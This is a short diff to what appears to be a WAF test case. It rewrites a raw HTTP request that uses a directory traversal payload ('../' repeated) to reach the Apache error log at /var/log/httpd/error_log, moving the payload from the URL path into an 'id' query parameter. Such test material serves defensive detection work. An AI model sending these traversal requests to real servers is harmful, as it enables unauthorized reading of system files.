@@ -1,6 +1,6 @@
 # 目录遍历_httpd/error_log
 # httpd/error_log是Apache HTTP服务器生成的日志文件，用于记录服务器发生的错误、警告和其他重要事件。
-GET /../../../../../../../../../../../../var/log/httpd/error_log?acid=80050823&bid=hd_tag_m8mv24kp HTTP/1.1
+GET /?id=../../../../../../../../../../../../var/log/httpd/error_log&acid=80050823&bid=hd_tag_m8mv24kp HTTP/1.1
 Host: www.swaf.com
 RM-PRO-BusinessID: hd_tag_m8mv24kp
 RM-PRO-Token: a0f1a284b3663766a402bedf47b828af
